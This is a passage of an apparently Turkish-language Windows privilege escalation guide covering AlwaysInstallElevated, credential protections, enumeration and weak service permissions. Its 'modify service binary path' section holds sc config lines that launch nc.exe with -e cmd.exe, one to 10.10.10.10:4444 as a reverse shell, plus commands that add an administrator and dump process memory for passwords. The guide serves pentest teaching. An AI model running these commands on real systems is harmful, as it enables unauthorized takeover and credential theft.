Kötü amaçlı `.msi` dosyasının kurulumunu **arka planda** çalıştırmak için:

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Bu güvenlik açığından yararlanmak için şunu kullanabilirsiniz: _exploit/windows/local/always_install_elevated_

## Antivirüs ve Algılayıcılar

### Denetim Ayarları

Bu ayarlar nelerin **kaydedileceğini** belirler, bu yüzden dikkat etmelisiniz.

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding, günlüklerin nereye gönderildiğini bilmek açısından ilginçtir.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS**, etki alanına katılmış bilgisayarlardaki **yerel Administrator parolalarını yönetmek** için tasarlanmıştır ve her parolanın **benzersiz, rastgele ve düzenli olarak güncellenmiş** olmasını sağlar. Bu parolalar Active Directory içinde güvenli bir şekilde saklanır ve yalnızca ACL'ler aracılığıyla yeterli izin verilen kullanıcılar tarafından erişilebilir; bu sayede yetkili kullanıcılar yerel admin parolalarını görüntüleyebilir.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Etkinse, **düz metin parolalar LSASS** (Local Security Authority Subsystem Service) içinde saklanır.\
[**Bu sayfada WDigest hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA Protection

**Windows 8.1** ile birlikte Microsoft, sisteme daha fazla güvenlik sağlamak için güvenilmeyen işlemlerin **belleğini okuma** veya kod enjekte etme girişimlerini **engellemek** amacıyla Local Security Authority (LSA) için gelişmiş koruma sunmuştur.\
[**LSA Protection hakkında daha fazla bilgi burada**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credentials Guard

**Credential Guard**, **Windows 10** ile kullanıma sunuldu. Amacı, bir cihazda depolanan kimlik bilgilerini pass-the-hash saldırıları gibi tehditlere karşı korumaktır. [**Credential Guard hakkında daha fazla bilgiye buradan ulaşabilirsiniz.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Önbelleğe Alınmış Kimlik Bilgileri

**Alan adı kimlik bilgileri**, **Local Security Authority** (LSA) tarafından doğrulanır ve işletim sistemi bileşenleri tarafından kullanılır. Bir kullanıcının oturum açma verileri kayıtlı bir güvenlik paketi tarafından doğrulandığında, kullanıcı için genellikle alan adı kimlik bilgileri oluşturulur.\
[**Önbelleğe Alınmış Kimlik Bilgileri hakkında daha fazla bilgi**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Kullanıcılar ve Gruplar

### Kullanıcıları ve Grupları Listeleme

Üyesi olduğunuz gruplardan herhangi birinin ilginç izinlere sahip olup olmadığını kontrol etmelisiniz

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Ayrıcalıklı gruplar

**Ayrıcalıklı bir grubun üyesiyseniz ayrıcalık yükseltebilirsiniz**. Ayrıcalıklı gruplar ve ayrıcalık yükseltmek için bunları nasıl kötüye kullanabileceğiniz hakkında buradan bilgi edinin:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

Bu sayfada **token**'ın ne olduğu hakkında **daha fazla bilgi edinin**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
İlginç token'lar ve bunları nasıl kötüye kullanabileceğiniz hakkında bilgi edinmek için aşağıdaki sayfaya göz atın:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Oturum açmış kullanıcılar / Oturumlar

```bash
qwinsta
klist sessions
```

### Ev klasörleri

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Parola İlkesi

```bash
net accounts
```

### Panodaki içeriği alma

```bash
powershell -command "Get-Clipboard"
```

## Çalışan Süreçler

### Dosya ve Klasör İzinleri

Öncelikle, süreçleri listelerken **sürecin komut satırında parola olup olmadığını kontrol edin**.\
**Çalışan bir binary'nin üzerine yazıp yazamayacağınızı** veya olası [**DLL Hijacking saldırılarından**](dll-hijacking/index.html) yararlanmak için binary'nin bulunduğu klasörde yazma izinleriniz olup olmadığını kontrol edin:

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Her zaman çalışan [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) olup olmadığını kontrol edin; bunları ayrıcalıkları yükseltmek için kötüye kullanabilirsiniz.

Bir debugger listener kısa süreliğine çalışıyor olabilir; bu nedenle tek bir pasif port anlık görüntüsünde görünmemesi, hiçbir zaman açığa çıkmadığını kanıtlamaz. Gözlemlenen listener'ları PID, süreç sahibi ve düşük ayrıcalıklı kullanıcının bunlara erişebilme olanağıyla ilişkilendirin; tek başına uygulama adı veya debug flag, kullanıcılar arası kod yürütme olanağını kanıtlamaz. Rutin numaralandırmayı pasif tutun; debugger komutları göndermeyin.

**Süreçlerin ikili dosyalarının izinlerini kontrol etme**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**İşlem ikililerinin bulunduğu klasörlerin izinlerini kontrol etme (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Snort dinamik ön işlemci dizinleri

Snort 2, `snort.exe -c <config>` ile seçilen yapılandırmada belirtilen `dynamicpreprocessor directory` içindeki paylaşımlı kitaplıkları yükleyebilir. Snort'u farklı bir hesap altında çalıştıran zamanlanmış bir görev veya hizmet için tam olarak bu yapılandırmayı ve belirtilen modül dizininin ACL'sini inceleyin. Token'ınız burada dosya oluşturabiliyorsa bu yol, görev veya hizmet modülleri bir sonraki yüklediğinde kod yürütme açısından incelenmeye değer bir adaydır. Çalıştırma hesabının etkin ayrıcalıklarını, etkin yapılandırmayı, modül uyumluluğunu ve tüm engelleme veya paylaşım kısıtlamalarını doğrulayın; tek başına yazılabilir bir dizin, ayrıcalık yükseltmeyi kanıtlamaz. [Snort'un dinamik ön işlemci belgeleri](https://www.snort.org/documents/dpx-readme) çalışma zamanı modül yüklemesini açıklar.

### Yazılabilir belge kökü olan ayrıcalıklı web hizmeti

Bir Windows Apache kurulumunda, hizmetin çalıştırılabilir dosya yolunu ve çalıştırma hesabını, etkin `httpd.conf` içindeki `DocumentRoot` ile karşılaştırın. Geleneksel bir XAMPP düzeninde `C:\xampp\apache\conf\httpd.conf` dosyasını ve yapılandırılmış belge kökünün (genellikle `C:\xampp\htdocs`) ACL'sini inceleyin. Daha düşük ayrıcalıklı bir kullanıcı, Apache `LocalSystem` olarak çalışırken bu kökte dosya oluşturabiliyorsa sunucu tarafı kod yürütme, ana makinenin ayrıcalık sınırını aşabilir. Hizmetin çalıştığını, tam olarak bu yolun sunulduğunu ve bir sunucu tarafı işleyicinin dosya türünü işlediğini doğrulayın; tek başına yazılabilir bir kök yalnızca dosya oluşturulabildiğini kanıtlar. Bir deneme dosyası yazmadan ACL'leri inceleyin:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Geleneksel bir WAMP kurulumunda hizmet, sürümlendirilmiş bir `C:\wamp64\bin\apache\apache*\bin\httpd.exe` dosyasını (32 bitlik düzende `C:\wamp\...`) gösterebilir; yapılandırma dosyası bunun yanındaki `conf\httpd.conf` altında, varsayılan kök dizin ise `C:\wamp64\www` veya `C:\wamp\www` olabilir. Tam hizmet görüntüsünü, çalıştırma kimliğini, etkin `DocumentRoot` değerini (`${INSTALL_DIR}` genişletmesi ve sanal ana makine geçersiz kılmaları dahil) ve kök dizinin ACL'sini birlikte kontrol edin. Yazılabilir bir WAMP dizini, Apache'nin `SYSTEM` olarak çalıştığını veya gönderilen dosyayı çalıştırdığını kanıtlamaz. [Apache, bir Windows hizmetinin yapılandırmasını nasıl seçtiğini belgeliyor](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Yazılabilir IIS kök dizini ve uygulama havuzunun ağ kimliği

IIS için, `applicationHost.config` içindeki yazılabilir fiziksel dizini **etkin bir site/uygulamayla** eşleştirin; ardından yapılandırılmış havuzu ve sunucu tarafı işleyicisini belirleyin. Sunulan bir dizine yerleştirilen kod, IIS bu dosya türünü işliyorsa ve yola erişilebiliyorsa havuz kimliğiyle çalışır. Yazılabilir bir dizini kod yürütme olarak değerlendirmeden önce mevcut kullanıcının etkin dosya oluşturma erişimini, site çalışma durumunu, işleyiciyi ve yola özel geçersiz kılmaları kontrol edin.

ASP.NET dinamik derlemesi, incelenmesi gereken ayrı bir yol oluşturur: uygulamanın derleme dizini altındaki oluşturulmuş dosyalar. Varsayılan dizin, ilgili .NET Framework kurulumunun altındaki `Temporary ASP.NET Files` dizinidir; ancak uygulamanın `<compilation tempDirectory>` ayarı bunu değiştirebilir. [Microsoft, konumu ve uygulama başına alt dizinleri belgeliyor](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) ve [uygulama havuzları birbirine güvenmediğinde derleme dizinlerinin yalıtılmasını öneriyor](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Daha düşük ayrıcalıklı bir token, **belirli** uygulamanın önbelleğindeki oluşturulmuş kaynağı değiştirebiliyorsa, uygulamanın bunu daha ayrıcalıklı bir [worker-process identity](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities) altında yeniden derleyip derlemediğini belirleyin. Tek başına bir dosya veya dizin ACL'si kod yürütüldüğünü kanıtlamaz: önbelleği etkin uygulama, etkin token ve ACL, derleme ayarları, süreç kimliği ve olası yeniden derleme zamanlamasıyla ilişkilendirin. Salt okunur meta veri incelemesi yapın; keşif sırasında derlemeyi tetiklemeyin veya önbellek dosyalarını değiştirmeyin.

`ApplicationPoolIdentity` veya `NetworkService` olarak yapılandırılmış bir IIS havuzu, yerel token'ı düşük ayrıcalıklı olsa bile etki alanı kaynaklarında genellikle **ana bilgisayar bilgisayar hesabı** olarak kimlik doğrular. `LocalSystem` zaten yerel olarak yüksek ayrıcalıklıdır ve ağda da bilgisayar hesabını kullanır; `LocalService` ise genellikle anonim ağ kimlik bilgileri sunar. `SpecificUser` havuzu, yapılandırılmış hesabını kullanır. [Microsoft bu kimlik türlerini belgeliyor](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) ve [uygulama havuzunun ağ kimliğini açıklıyor](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Atlanmış bir kimlik ayarı havuz varsayılanlarından devralınabilir; bunlar IIS sürümleri arasında değiştiğinden, havuz adına bakarak tahmin etmek yerine etkin yapılandırmayı belirleyin. Kod yürütme bilgisayar hesabı ağ kimliğine sahip bir havuza ulaşıyorsa, **o bilgisayarın** dizin haklarını değerlendirin. [DCSync](../active-directory-methodology/dcsync.md), etki alanı adlandırma bağlamında çoğaltma hakları gerektirir; tek başına bir makine hesabı bileti veya ana bilgisayar rolü bu hakların varlığını kanıtlamaz. Pasif keşif sırasında dosya yüklemeden, ağ kimlik doğrulaması yapmadan veya bilet istemeden yapılandırma ve ACL'leri inceleyin.

Yardımcı bir süreç başlatan, okunabilir bir ASP.NET işleyicisi için istekten türetilen değerleri kimlik doğrulama, şifre çözme, doğrulama ve komut oluşturma adımlarından izleyin. Çözümlenmiş bir token'ı `ProcessStartInfo("cmd", "/c ...")` içine birleştiren işleyici, kabuk meta karakterlerinin komutu değiştirmesine olanak tanıyabilir; [Microsoft, `cmd` özel karakterlerini belgeliyor](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Güvenilmeyen bir çağıranın çözümlenmiş değeri gerçekten etkileyebildiğini ve işleyiciye erişebildiğini doğrulayın; ardından etkin uygulama havuzu veya kimliğe bürünülmüş kimliği ve alt sürecin kimliğini belirleyin. Okunabilir bir kaynak satırı, localhost dinleyicisi veya token biçimindeki bir zayıflık tek başına ayrıcalıklı komut yürütüldüğünü kanıtlamaz. Pasif keşif sırasında sahte istekler göndermeden veya yardımcı programı çalıştırmadan kaynak kodunu ve havuz yapılandırmasını inceleyin.

Windows'ta çalışan bir PHP hizmetinde, istek tarafından kontrol edilen ve [`include` veya `require`](https://www.php.net/manual/en/function.include.php) işlevine aktarılan bir yol, düşük kullanıcının yazabildiği bir PHP dosyasını worker kimliği altında değerlendirebilir. İsteğin bu ifadeye ulaşabildiğini, çözümlenen yolun düşük kullanıcının değiştirebildiği ve worker'ın okuyabildiği bir dosyayı belirttiğini, geçerli PHP yol kısıtlamalarının include işlemine izin verdiğini ve worker'ın gerçekten daha yüksek ayrıcalıklarla çalıştığını doğrulayın. Bir loopback dinleyicisi veya yazılabilir bir dosya tek başına bu zinciri kanıtlamaz; pasif keşif sırasında endpoint'i çağırmadan kaynak kodunu, hizmet kimliğini ve dosya ACL'lerini inceleyin.

### Bellekten Parola Madenciliği

Sysinternals'tan **procdump** kullanarak çalışan bir sürecin bellek dökümünü oluşturabilirsiniz. FTP gibi hizmetlerin belleğinde **kimlik bilgileri açık metin olarak bulunur**; belleği döküp kimlik bilgilerini okumayı deneyin.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Güvenli olmayan GUI uygulamaları

**SYSTEM olarak çalışan uygulamalar, bir kullanıcının CMD başlatmasına veya dizinlere göz atmasına izin verebilir.**

Örnek: "Windows Help and Support" (Windows + F1), "command prompt" için arama yapın, "Click to open Command Prompt" seçeneğine tıklayın

### Ayrıcalıklı proje dosyası içe aktarma

Düşük ayrıcalıklı bir kullanıcının yazabildiği bir drop dizininden projeleri otomatik olarak açan bir uygulama, içe aktarıcı hesabı altında bir girdi güven sınırını aşar. **Yazılabilir tam yolu**, bu yolu açan işlemi veya görevi, etkin kimliğini ve ayrıştırıcının derlemesini inceleyin. [Geçmişteki bir Ghidra projesi açma/geri yükleme sorunu](https://github.com/NationalSecurityAgency/ghidra/issues/71), proje meta verilerinde XML external entity kullanımına izin veriyordu; Windows'ta bir ağ entity'si, [giden SMB ve NTLM ilkeleri](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking) izin veriyorsa içe aktarma hesabından kimlik doğrulamayı tetikleyebilirdi. Bu, kimlik bilgisi açığa çıkması olasılığıdır; doğrudan yönetici erişimi sağlamaz: yanıtın ayrı bir yetkili veya savunmasız yol üzerinden kullanılabilmesi gerekir ve güncel derlemeler gerçek yama durumlarına göre değerlendirilmelidir. Pasif envanter sırasında hazırlanmış bir projeyi açmayın; içe aktarma iş akışını ve ACL'leri inceleyin.

## Hizmetler

Service Control Manager (SCM) nesnesindeki [`SC_MANAGER_CREATE_SERVICE` hakkı](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights), mevcut bir hizmet üzerindeki haklardan ayrıdır. Bu hak için salt okunur bir [`OpenSCManager erişim isteğinin`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) başarılı olması, inceleme için bir ipucudur; yeni bir hizmetin çalıştırılabileceğinin kanıtı değildir. [`CreateService bir handle döndürür`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) ve bu handle, oluşturma sırasında istenen hizmet erişim haklarına sahiptir; hizmeti daha sonra yeniden açmak ayrı bir erişim denetimini tetikler ve ilk handle kullanılabilir olsa bile başarısız olabilir. Etkin yerel veya uzak token'ı, verilen handle haklarını, hizmet hesabını, başlatma ilkesini ve çalıştırılabilir dosyanın yolunu ayrı ayrı doğrulayın. Pasif envanter sırasında hizmet oluşturmayın veya başlatmayın.

Uzak hizmet kurulum yolu için bu SCM haklarını, hedefteki **aynı ağ oturum açma hesabının** yazabildiği bir paylaşımla, paylaşımın temelindeki NTFS ACL'siyle ve hizmet hesabının çalıştırabileceği yerel bir çalıştırılabilir dosya yoluyla ilişkilendirin. SCM hakları alışılmadık derecede genişse ve dosya yerleştirme yolu da mevcutsa, yönetici olmayan bir hesap bu sınırı aşabilir; yönetim paylaşımı zorunlu değildir. Yalnızca paylaşımda yazma erişimi veya yalnızca SCM hizmet oluşturma hakkı ipucu, yeni hizmetin daha yüksek bir kimlikle başlayabileceğini kanıtlamaz.

Mevcut bir hizmet, yardımcı dosya `ImagePath` içinde bulunmasa bile başlangıçta, kapanırken veya başka bir yaşam döngüsü olayı sırasında yardımcı bir çalıştırılabilir dosya çağırabilir. Yardımcı dosya adı, düşük ayrıcalıklı bir kullanıcının yazabildiği bir dizinde çözümleniyorsa ve hizmet daha yüksek bir kimlikle çalışıyorsa, eksik yardımcı dosya koşullu bir değiştirme adayıdır. **Gerçek hizmet kodunu veya belgelenmiş yardımcı dosya çağrısını**, çözümlenen çalıştırılabilir dosya yolunu ve arama sırasını, dizin oluşturma haklarını, hizmet kimliğini ve kullanılabilir bir yaşam döngüsü tetikleyicisini doğrulayın. Yazılabilir bir hizmet dizini veya eksik bir dosya tek başına hizmetin bu dosyayı yüklediğini göstermez; pasif inceleme sırasında hizmeti başlatmayın veya durdurmayın.

Mevcut bir hizmet için [`SERVICE_START`, `StartService` işlevine bağımsız değişkenler verilmesine izin verir](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); bu hak [`SERVICE_CHANGE_CONFIG` hakkından](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) ayrıdır. Başlatma erişimini bir denetim hakkından daha fazlası olarak değerlendirmeden önce hizmetin kodunu veya belgelenmiş arayüzünü inceleyin. Çağıranın seçtiği bir bağımsız değişkeni günlük veya dışa aktarma yolu olarak kullanıyorsa hizmet kimliğini, bağımsız değişkenden yazma işlemine giden tam akışı, yol kısıtlamalarını ve **oluşturulan dosyanın** izinlerini doğrulayın. Korumalı bir dizine yazma işlemi, ancak bu dosyayı kabul eden ayrı bir ayrıcalıklı tüketici veya yükleyici varsa yükseltmeye dönüşebilir; yazılabilir bir günlük veya başlatma hakkı tek başına yeterli değildir. Pasif envanter sırasında hizmeti başlatmayın veya test dosyası oluşturmayın.

NSClient++ izleme aracısı için okunabilir bir `nsclient.ini`, **yapılandırma incelemesi için bir ipucudur**: web kimlik bilgilerini içerebilir; `boot.ini` ise yapılandırmayı başka bir konuma yönlendirebilir. Gerçek hizmet hesabını, WEB dinleyicisini ve erişim ilkesini, ayrıca kimliği doğrulanmış rolün ayarları veya script'leri değiştirip değiştiremediğini kontrol edin. Ayrıcalıklı çalıştırma için ek olarak `CheckExternalScripts` (veya etkin başka bir çalıştırma yolu), bir komutu kaydetme ya da değiştirme konusunda etkin bir hak ve komutu hizmet kimliği altında çalıştıran bir tetikleyici gerekir. Yalnızca loopback adresini dinleyen bir dinleyiciye yerel bir kullanıcı yine de erişebilir; ancak dosya yolu, parola veya dinleyici tek başına bu hakların varlığını göstermez. Pasif envanter sırasında sırları göstermeden ve web API'sini çağırmadan meta verileri ve izinleri inceleyin. Bkz. [NSClient++ dosya düzeni](https://nsclient.org/docs/concepts/file-layout/), [web ve script güvenliği kılavuzu](https://nsclient.org/docs/setup/securing/) ve [external-script yapılandırması](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

`ImagePath` değeri `nssm.exe` olan bir hizmet için hizmetin gerçek çalıştırma hesabını ve `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application` değerini inceleyin: [NSSM, alt uygulamayı burada saklar](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h); `AppDirectory` ise yapılandırılmış çalışma dizinidir. Wrapper'ın izinlerini hizmetin tüm güvenlik sınırı olarak değerlendirmeden önce alt uygulamanın çalıştırılabilir dosyasını ve üst dizin ACL'lerini kontrol edin. Bu alt uygulamanın sunduğu yerel bir WCF veya SOAP endpoint'i ayrı bir inceleme ipucudur: düşük ayrıcalıklı kullanıcının dinleyiciye erişebildiğini, ilgili işlemin kullanıcının girdisini kabul ettiğini ve hizmet alt uygulamasının güvenli olmayan işlemi daha yüksek bir kimlikle yürüttüğünü doğrulayın. Hizmet hesabı, bir endpoint URL'si veya yazılabilir bir yol tek başına yükseltmeyi kanıtlamaz; pasif envanter sırasında hizmet işlemlerini çağırmayın.

Özel bir WCF işlemi için çağıranın denetleyebildiği bir dizenin herhangi bir PowerShell runspace'ine aktarılıp aktarılmadığını izleyin. [`Pipeline.Commands.AddScript`, script metni ekler](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript) ve [`Pipeline.Invoke`, pipeline'ı çalıştırır](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [Windows transport credentials kullanan bir `netTcpBinding`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) istemcinin kimliğini doğrular; ancak **belirli** işlemi çağırma yetkisi ve runspace'in etkin kimliği ayrıca denetlenmelidir. Düşük ayrıcalıklı bir çağıranın girdisinden daha yüksek hizmet kimliği altında `AddScript` kullanımına giden bir yol, kod çalıştırma sınırıdır; dinleme yapan bir port, kimliği doğrulanmış bir istemci veya ilgisiz bir assembly'de kullanılmayan bir metot tek başına kanıt değildir. Envanter sırasında endpoint'i çağırmadan dağıtılmış hizmeti, contract'ı, yetkilendirmeyi ve impersonation ayarlarını statik olarak inceleyin.

Service Triggers, belirli koşullar oluştuğunda Windows'un bir hizmeti başlatmasına olanak tanır (named pipe/RPC endpoint etkinliği, ETW olayları, IP kullanılabilirliği, cihazın bağlanması, GPO yenilemesi vb.). SERVICE_START hakları olmadan da tetikleyicileri çalıştırarak ayrıcalıklı hizmetleri çoğu zaman başlatabilirsiniz. Sayım ve etkinleştirme teknikleri burada açıklanmıştır:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Visual Studio tanılama toplayıcı hizmeti

C/C++ araçlarını içeren Visual Studio kurulumlarında `VSStandardCollectorService150` adlı ve `LocalSystem` olarak çalışacak şekilde yapılandırılmış bir tanılama hizmeti bulunabilir. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) bir hizmet DACL sıfırlamasını yönlendirmek için junction ve object-manager-link yarışından yararlandı. Gösterilen yükseltme için kullanılabilir bir Visual Studio Setup WMI Provider MSI onarım yolu ve `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe` hedefi de gerekiyordu. Bileşen Ocak 2024'te düzeltildi.

Pasif ön inceleme için yalnızca bu hizmetin hesabını ve ikili dosya yolunu inceleyin, Setup WMI derleyici yolunun mevcut olup olmadığını kontrol edin ve kurulu bileşenin yama durumunu doğrulayın. Bir hizmet girdisi, Visual Studio ürün sürümü veya derleyici dosyası tek başına ana makinenin savunmasız olduğunu göstermez. İnceleme sırasında hizmeti başlatmak veya onarım çalıştırmak gerekmez.

Hizmetlerin listesini alın:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### İzinler

Bir servis hakkında bilgi edinmek için **sc** kullanabilirsiniz.

```bash
sc qc <service_name>
```

Her hizmet için gereken ayrıcalık düzeyini kontrol etmek üzere _Sysinternals_’tan **accesschk** binary’sinin bulundurulması önerilir.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

"Authenticated Users" grubunun herhangi bir hizmeti değiştirip değiştiremediğini kontrol etmeniz önerilir:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[XP için accesschk.exe dosyasını buradan indirebilirsiniz](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Hizmeti etkinleştirme

Örneğin SSDPSRV için aşağıdaki hatayı alıyorsanız:

_Sistem hatası 1058 oluştu._\
_Hizmet başlatılamıyor; çünkü devre dışı bırakılmış veya etkinleştirilmiş hiçbir cihazla ilişkilendirilmemiş._

Aşağıdakini kullanarak etkinleştirebilirsiniz:

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**upnphost hizmetinin çalışması için SSDPSRV'ye bağlı olduğunu unutmayın (XP SP1 için)**

**Bu soruna yönelik başka bir geçici çözüm** şunu çalıştırmaktır:

```
sc.exe config usosvc start= auto
```

### **Hizmet ikili dosya yolunu değiştirme**

"Authenticated users" grubunun bir hizmet üzerinde **SERVICE_ALL_ACCESS** iznine sahip olduğu senaryoda, hizmetin yürütülebilir ikili dosyasını değiştirmek mümkündür. **sc**'yi değiştirmek ve çalıştırmak için:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Hizmeti yeniden başlat

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

İzinler çeşitli yollarla yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Servis binary'sinin yeniden yapılandırılmasına izin verir.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasını sağlar ve böylece servis yapılandırmalarını değiştirme olanağı verir.
- **WRITE_OWNER**: Sahipliğin alınmasına ve izinlerin yeniden yapılandırılmasına olanak tanır.
- **GENERIC_WRITE**: Servis yapılandırmalarını değiştirme yeteneğini devralır.
- **GENERIC_ALL**: Servis yapılandırmalarını değiştirme yeteneğini de devralır.

Bu güvenlik açığının tespiti ve exploit edilmesi için _exploit/windows/local/service_permissions_ kullanılabilir.

### Servis binary'lerinde zayıf izinler

Bir servis **`LocalSystem`**, **`LocalService`**, **`NetworkService`** veya ayrıcalıklı bir domain hesabı olarak çalışıyorsa, ancak **düşük ayrıcalıklı kullanıcılar servis EXE'sini veya üst klasörünü değiştirebiliyorsa**, servis çoğu zaman **binary değiştirilip servis yeniden başlatılarak** ele geçirilebilir.

**Bir servis tarafından çalıştırılan binary'yi değiştirip değiştiremeyeceğinizi** veya **binary'nin bulunduğu klasör üzerinde yazma izniniz olup olmadığını** kontrol edin ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Bir servis tarafından çalıştırılan tüm binary'leri **wmic** (system32'de bulunmaz) kullanarak listeleyebilir ve izinlerinizi **icacls** kullanarak kontrol edebilirsiniz:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Ayrıca **sc** ve **icacls** kullanabilirsiniz:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**, **`BUILTIN\Users`** veya **`Authenticated Users`** için verilmiş tehlikeli ACL'leri, özellikle hizmetin çalıştırılabilir dosyasında veya bu dosyayı içeren dizinde **`(F)`**, **`(M)`** ya da **`(W)`** izinlerini arayın. Uygulanabilir bir kötüye kullanım akışı şöyledir:<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` ile hizmet hesabını ve çalıştırılabilir dosya yolunu doğrulayın.
2. `icacls <path>` ile ikili dosyanın yazılabilir olduğunu doğrulayın.
3. Hizmet ikili dosyasını bir payload veya geçerli bir kötü amaçlı hizmet ikili dosyasıyla değiştirin.
4. `sc stop <service_name> && sc start <service_name>` ile hizmeti yeniden başlatın (veya yeniden başlatma / hizmet tetikleyicisi gerçekleşene kadar bekleyin).

Yararlı otomatik kontroller:<sup>[[28]](#references)</sup>

